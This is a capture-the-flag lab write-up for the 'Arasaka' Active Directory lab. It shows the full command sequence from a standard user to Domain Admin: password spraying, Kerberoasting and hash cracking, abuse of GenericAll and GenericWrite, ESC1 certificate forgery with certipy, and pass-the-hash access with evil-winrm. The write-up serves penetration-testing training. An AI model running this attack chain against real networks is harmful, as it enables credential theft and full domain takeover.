# ARASAKA

## ARASAKA

![image.png](<../../.gitbook/assets/image (3).png>)

## Scenario-Starting Credentials

```bash
faraday:hacksmarter123
```

### Objective and Scope

You are a member of the Hack Smarter Red Team. This penetration test will operate under an assumed breach scenario, starting with valid credentials for a standard domain user, `faraday`.

The primary goal is to simulate a realistic attack, identifying and exploiting vulnerabilities to escalate privileges from a standard user to a Domain Administrator.

### Recon ,Scanning, and Enumeration

#### Rustscan

```bash
RedBlue@Frank Arasaka % rustscan -a 10.0.24.128 -- -A

<SNIP>

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-11-19 03:36:48Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:   fae9:1340:b0a8:16fc:0420:5560:a2c9:6fed
| SHA-1: affe:d211:3720:65b4:1ee7:d8da:1a58:6825:5903:d150

445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:   fae9:1340:b0a8:16fc:0420:5560:a2c9:6fed
| SHA-1: affe:d211:3720:65b4:1ee7:d8da:1a58:6825:5903:d150

3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:   fae9:1340:b0a8:16fc:0420:5560:a2c9:6fed
| SHA-1: affe:d211:3720:65b4:1ee7:d8da:1a58:6825:5903:d150

|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:   fae9:1340:b0a8:16fc:0420:5560:a2c9:6fed
| SHA-1: affe:d211:3720:65b4:1ee7:d8da:1a58:6825:5903:d150
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HACKSMARTER
|   NetBIOS_Domain_Name: HACKSMARTER
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hacksmarter.local
|   DNS_Computer_Name: DC01.hacksmarter.local
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-19T03:37:48+00:00
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Issuer: commonName=DC01.hacksmarter.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-20T02:51:46
| Not valid after:  2026-03-22T02:51:46
| MD5:   c15b:e7bf:300c:7994:c7c0:c1a5:2fcd:928c
| SHA-1: 97ac:c4b4:fb84:3417:e8fb:e9b1:a5ae:4357:bb1f:12e9

|_ssl-date: 2025-11-19T03:38:28+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49865/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
55322/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
55323/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
55335/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
55351/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
55367/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC

```

* Our rustscan revealed a lot of interesting information for our recon and enumeration
* We do have `DC01.hacksmarter.local` `hacksmarter.local` `hacksmarter-DC01-CA` which we need to add to our `/etc/hosts`

#### Initial access with our provided Creds `faraday:hacksmarter123`

```bash
nxc smb hacksmarter.local -u faraday -p 'hacksmarter123' --shares
```

![image.png](<../../.gitbook/assets/image 1 (2).png>)

* We can confirm the creds and also there is not much to the shares
* As a best practice, we can enumerate for other users since `IPC$` has read permissions to it

### Checking for quick wins

As best a practice, always check for the following:

* Enumerating other users
* Enumerating for pre-created computer accounts
* Enumerating for `certificate services`
* Enumerating for `ZeroLOgon`
* Enumerating for `Kerberoasting` and `AS-REP` - We can also get this from `Bloodhound`
* Enumerating for `gpp_autologin`

NB - Sometimes not necessary but worth digging into.

```bash
nxc smb hacksmarter.local -u 'faraday' -p 'hacksmarter123' --rid-brute | grep 'SidTypeUser' 
nxc ldap hacksmarter.local -u "faraday" -p 'hacksmarter123' -M pre2k
nxc ldap hacksmarter.local -u "faraday" -p 'hacksmarter123' -M adcs
nxc smbhacksmarter.local -u faraday -p 'hacksmarter123' -M zerologon
nxc smb  hacksmarter.local -u faraday -p hacksmarter123 -M gpp_autologin

```

#### Enumerating other users

```bash
nxc smb hacksmarter.local -u 'faraday' -p 'hacksmarter123' --rid-brute | grep 'SidTypeUser' > names.txt

awk '{print $6}' names.txt | sed 's/HACKSMARTER\\//' > users.txt

```

![image.png](<../../.gitbook/assets/image 2 (3).png>)

*   We have a list of users and a password, as a best practice again we can attempt to password spry for password reuse

    ```bash
    nxc smb  10.0.24.128 -u users.txt -p 'hacksmarter123' --continue-on-success
    ```

![image.png](<../../.gitbook/assets/image 3 (3).png>)

* Only the user `faraday` uses the password `hacksmarter123`

#### Enumerating for pre-created computer accounts

![image.png](<../../.gitbook/assets/image 4 (2).png>)

* No pre-created computer account

#### Enumerating for `certificate services`

![image.png](<../../.gitbook/assets/image 5 (1).png>)

* We have found a CN and will test for ADCS misconfigurations
* This was obtained from our `rustscan`
* We shall get back to this

We can manually enumerate for `Kerberoasting and AS-REP` but i prefer enumerating them with bloodhound.

### Bloodhound

We can use the provided creds `faraday:hacksmarter123` to obtain the loot

```bash
nxc ldap DC01.hacksmarter.local -u 'faraday' -p 'hacksmarter123' --bloodhound --collection All --dns-server  10.0.24.128
```

![image.png](<../../.gitbook/assets/image 6 (2).png>)

#### Bloodhound enumeration

There is a lot we can find and do with bloodhound. My to-do is as below for quick wins

* Check All domain Admins
* Check for all Kerberoastable user accounts
* Find Shortest path to admin

![image.png](<../../.gitbook/assets/image 7 (1).png>)

* `faraday` user has nothing interesting.
* We then have to go for our checklist above

![image.png](<../../.gitbook/assets/image 8 (1).png>)

* Queried for `All Domain Admins` and we have an interesting Admin `The_Emperor`

![image.png](<../../.gitbook/assets/image 9 (1).png>)

* `ALT.SVC` is a Kerberoastable user and is also in our `users.txt` file
* We can perform kerberoasting

![image.png](<../../.gitbook/assets/image 10 (1).png>)

*   Attempting to crack the hash

    ```bash
    RedBlue@Frank Arasaka % ./ad-hashcat-kerberoast.sh 
    What is the challenge/hash file? 
    hash.txt

    ```

![image.png](<../../.gitbook/assets/image 11 (1).png>)

* We were successful in cracking the hash and the password for the `alt.svc` is `babygirl1`
* As a best practice, we can also perform a password spry amongst the `users.txt` to check for a password reuse
* The script used above was obtained from https://github.com/TeneBrae93/offensivesecurity/tree/main/active-directory

![image.png](<../../.gitbook/assets/image 12 (1).png>)

* The `Alt.svc` has `GenericAll` over `Yorinobu` user
* This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.

![image.png](<../../.gitbook/assets/image 13 (1).png>)

![image.png](<../../.gitbook/assets/image 14 (1).png>)

* The user `YORINOBU@HACKSMARTER.LOCAL` has generic write access to the user `SOULKILLER.SVC@HACKSMARTER.LOCAL.`
* `GenericWrite` access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user.
* The user `YORINOBU@HACKSMARTER.LOCAL` is a member of `Remote Management & Remote Desktop` and we can `rdp or Evilwinrm`

![image.png](<../../.gitbook/assets/image 15 (1).png>)

* The `SOULKILLER.SVC@HACKSMARTER.LOCAL` user has not much to it yet.

### Mapping our Attack Vector

* Abusing AD-DACL `GenericALL` to compromising user `Yorinobu.`
* We can use `YORINOBU` user to `rdp` or `evil-winrm` to potentially gain our initial foothold.
* We can probably get our `user-flag` _**HOPEFULLY.**_

NB. We also haven't looked at the Certificate Authority `hacksmarter-DC01-CA` . We shall look into it.

#### Compromising user `Yorinobu`

![image.png](<../../.gitbook/assets/image 12 (1).png>)

*   Attempting to change the password

    ```bash
    net rpc password "Yorinobu" 'RedBlue!@7' -U "hacksmarter.local"/"alt.svc"%"babygirl1" -S "10.0.24.128"
    ```

    ```bash
    evil-winrm -i 10.0.24.128 -u Yorinobu -p 'RedBlue!@7'
    ```

![image.png](<../../.gitbook/assets/image 17 (2).png>)

* We were able to successfully connect with `Evil-winrm` But however, there was no USER-FlAG.
* Well the only flag required however is the `root.txt` flag.

Comment:

_I went down a rabbit hole so deep even BloodHound asked if I needed help. LOL_

* We still have one more hope - CA

### Enumerating and Compromising CA

![image.png](<../../.gitbook/assets/image 5 (1).png>)

* The above information was obtained when we were checking for our quick wins above.

#### Checking for vulnerable certs

```bash
certipy-ad find -u 'Yorinobu@hacksmarter.local' -p 'RedBlue!@7' -dc-ip 10.0.24.128
```

![image.png](<../../.gitbook/assets/image 19 (3).png>)

![image.png](<../../.gitbook/assets/image 20 (1).png>)

* Nothing we found so far is of interest
* QUESTION IS WHAT NEXT?????????????????????????????
* REMEMBER WE HAD A USER `SOULKILLER` that user `Yorinobu` has `GenericWrite` to it..
* We know that we have CA and probably might be our way. Lets find the work around.

### Compromising `SOULKILLER.svc`

![image.png](<../../.gitbook/assets/image 21 (2).png>)

* The user `YORINOBU` has generic write access to the user `SOULKILLER.svc`
* `Generic Write` access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "`serviceprincipalnames`" for a user
*   We can either perform a `Targeted Kerberoast` or `Shadow Credentials attack`

    ```bash
    targetedKerberoast.py -v -d 'hacksmarter.local' -u 'Yorinobu' -p 'RedBlue!@7'
    ```

![image.png](<../../.gitbook/assets/image 22 (2).png>)

*   Attempting to crack the hash

    ```bash
    hashcat -m 13100 -a 0 <challenge.txt> /usr/share/wordlists/rockyou.txt

    ```

    ![image.png](<../../.gitbook/assets/image 23 (2).png>)

    * We successfully obtained the password for user `SOULKILLER.svc`

Confirming our new Creds

* Remember to password spry every new password we find. It might not be the case here.

```bash
SOULKILLER:MYpassword123#
nxc smb 10.0.24.128 -u Soulkiller.svc -p 'REDACTED'
```

![image.png](<../../.gitbook/assets/image 24 (2).png>)

* We can confirm that our creds worked
* Now what should we do with these creds??????????????????????????????????????
*   Remember our CA - What can happen if we check for a vulnerable certificate using creds of `Soulkiller.svc`

    ```bash
    certipy-ad find -u 'soulkiller.svc@hacksmarter.local' -p 'REDACTED' -dc-ip 10.0.24.128 -vulnerable
    ```

![image.png](<../../.gitbook/assets/image 25 (2).png>)

![image.png](<../../.gitbook/assets/image 26 (2).png>)

#### Exploiting ESC1

Exploiting an ESC1 vulnerability typically involves two main steps:

1. Requesting a certificate using the vulnerable template, injecting the identity of a privileged target.
2. Using the obtained certificate to authenticate as the target.

```bash
certipy-ad account -u 'soulkiller.svc' -p 'REDACTED' -dc-ip '10.0.24.128' -user 'administrator' read

certipy-ad req \
    -u 'soulkiller.svc@hacksmarter.local' -p 'REDACTED' \
    -dc-ip '10.0.24.128' -target 'DC01.hacksmarter.LOCAL' \
    -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' \
    -upn 'administrator@hacksmarter.local' -sid 'S-1-5-21-3154413470-3340737026-2748725799-500'
```

![image.png](<../../.gitbook/assets/image 27 (1).png>)

![image.png](<../../.gitbook/assets/image 28 (1).png>)

* Failed to request the certificate with `administrator SID`
* In our bloodhound query we also had a `The_Emperor` as one of `All Domain Admins`

THERE IS A VERY BIG MISTAKE I DID ON REQUESTING A CERTIFICATE AS THE ADMINISTRATOR. WELL CAN YOU SPOT IT. IF SO YOU CAN TRY AGAIN

![image.png](<../../.gitbook/assets/image 8 (1).png>)

*   Requesting for an SID of `The_Emperor` user

    ```bash
    certipy-ad account -u 'soulkiller.svc' -p 'REDACTED' -dc-ip '10.0.24.128' -user 'the_emperor' read
    ```

![image.png](<../../.gitbook/assets/image 30 (1).png>)

```bash
certipy-ad req \
    -u 'soulkiller.svc@hacksmarter.local' -p 'REDACTED' \
    -dc-ip '10.0.24.128' -target 'DC01.hacksmarter.local' \
    -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' \
    -upn 'the_emperor@hacksmarter.local' -sid 'S-1-5-21-3154413470-3340737026-2748725799-1601'
```

![image.png](<../../.gitbook/assets/image 31 (1).png>)

* The output confirms that a certificate was issued
*   The attacker now uses the generated `the_emperor.pfx` file with certipy auth to authenticate to the domain as the Administrator. This typically involves Kerberos PKINIT.

    ```bash
    certipy-ad auth -pfx 'the_emperor.pfx' -dc-ip '10.0.24.128'
    ```

![image.png](<../../.gitbook/assets/image 32 (2).png>)

```bash
evil-winrm -i 10.0.24.128 -u the_emperor -H d8764<REDACTED>f90f5f30bd6789b133
```

### FLAG

```bash
gci C:\ -Include 'root.txt' -File -Recurse -ErrorAction SilentlyContinue | % { "=== $($_.FullName) ==="; gc -Raw -Encoding UTF8 $_.FullName }
```

![image.png](<../../.gitbook/assets/image 33 (2).png>)

### HURRAY. We did it!!!!!!!!!
